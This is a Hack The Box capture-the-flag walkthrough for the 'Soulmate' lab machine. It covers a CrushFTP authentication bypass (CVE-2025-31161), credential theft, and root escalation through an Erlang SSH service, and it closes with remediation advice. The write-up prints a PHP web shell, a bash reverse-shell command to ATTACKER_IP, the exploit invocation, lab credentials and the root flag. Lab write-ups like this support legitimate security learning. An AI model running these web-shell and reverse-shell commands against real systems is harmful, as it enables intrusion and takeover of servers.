@@ -1,0 +1,156 @@
+HTB Soulmate - 4ss3m Walkthrough
+Machine: Soulmate
+Difficulty: Easy
+Platform: Hack The Box
+Author: 4ss3m
+
+Executive Summary
+The Soulmate machine was compromised by exploiting an authentication bypass vulnerability (CVE-2025-31161) in a CrushFTP instance accessible via a hidden subdomain. This led to initial access via a web shell, lateral movement to a user ben, and privilege escalation to root by abusing a misconfigured Erlang SSH service running locally with elevated privileges.
+
+Reconnaissance & Enumeration
+Network Scanning
+Initial reconnaissance with nmap revealed two primary services running on the target.
+
+
+nmap -sC -sV -p- --min-rate 10000 soulmate.htb
+
+
+Findings:
+
+Port 22/tcp: OpenSSH 8.9p1 Ubuntu
+
+Port 80/tcp: nginx 1.18.0 (HTTP web server)
+
+Web Application & Subdomain Enumeration
+The main website was a "Soulmate" dating application. Virtual host enumeration uncovered a critical subdomain.
+
+
+ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
+
+
+Discovery: ftp.soulmate.htb was found and added to the /etc/hosts file. This subdomain hosted a CrushFTP login page.
+
+Initial Foothold
+Vulnerability Assessment
+The CrushFTP server version 11.W.657 was identified from the page source and found to be vulnerable to CVE-2025-31161, a critical authentication bypass flaw.
+
+Exploitation (CVE-2025-31161)
+A public exploit was used to create a new admin user by targeting the default crushadmin user.
+
+git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161.git
+cd CVE-2025-31161
+python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user zero --password '1234'
+
+Gaining Code Execution
+Logged into CrushFTP with the new admin credentials (zero:1234) at http://ftp.soulmate.htb/WebInterface/login.html.
+
+Changed ben's password via the User Manager to a known value (1111).
+
+Logged in as ben and uploaded a PHP web shell (shell.php) to the /webProd/ directory, which was mapped to the web root of soulmate.htb.
+
+
+<?php system($_GET['cmd']); ?>
+
+
+4. Obtained a reverse shell by accessing the web shell and executing a connect-back command.
+
+
+
+# Attacker (listener)
+nc -lnvp 4444
+# Victim (via browser)
+http://soulmate.htb/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+
+
+
+5. Stabilized the shell as www-data.
+
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Press Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+
+
+
+Privilege Escalation to User
+Lateral Movement to ben
+Analysis of the system revealed a script containing ben's plaintext password .
+
+
+
+cat /usr/local/lib/erlang_login/start.escript
+
+
+
+Credentials Found: ben:HouseH0ldings998
+
+Access was upgraded to a stable SSH session as ben and the user flag was captured.
+
+
+su ben
+# Password: HouseH0ldings998
+cat /home/ben/user.txt
+
+
+
+Privilege Escalation to Root
+Internal Service Abuse
+Network enumeration revealed an Erlang-based SSH service running on local port 2222 .
+
+
+
+ss -tulpn | grep 2222
+
+
+
+Root Access via Erlang Shell
+The service was connected to using ben's credentials, providing an Erlang shell with root privileges . The os:cmd/1 function allowed for command execution as root.
+
+
+
+ssh -p 2222 ben@localhost
+# Password: HouseH0ldings998
+
+
+(ssh_runner@soulmate)1> os:cmd("whoami").
+"root\n"
+(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
+"02ab93d2c727c6831a5b72a7a9ed139b\n"
+
+
+
+
+Vulnerability Analysis
+CVE-2025-31161 (CrushFTP Authentication Bypass)
+Type: Authentication Bypass
+
+Cause: Improper access control in the user registration mechanism.
+
+Impact: Allows an unauthenticated attacker to register a new user with administrator privileges by specifying an existing admin username (like the default crushadmin) during registration, without needing the actual credentials.
+
+Privilege Escalation via Erlang Service
+Type: Misconfigured Service
+
+Cause: An Erlang SSH daemon running as root on port 2222 was configured to authenticate with local user passwords.
+
+Impact: Successful authentication granted an interactive Erlang shell with the privileges of the parent process (root). The built-in os:cmd/1 function executed operating system commands with these elevated privileges.
+
+Indicators of Compromise (IoC)
+Web Shell: /var/www/soulmate.htb/public/shell.php
+
+Unauthorized Admin User: zero
+
+Suspicious Network Activity: Inbound connections to port 4444 (reverse shell), SSH connections to port 2222.
+
+Remediation & Lessons Learned
+Patch Management: Immediately update CrushFTP to a version patched against CVE-2025-31161.
+
+Principle of Least Privilege: The Erlang SSH service should not run as root. Use a dedicated, low-privileged service account.
+
+Network Segmentation: Restrict access to internal services like the Erlang daemon (port 2222); it should not be accessible even locally for standard users.
+
+Credential Management: Never store plaintext passwords in executable scripts or configuration files.
+
+Input Validation: The web application should implement strict upload filters to prevent execution of malicious scripts like web shells.
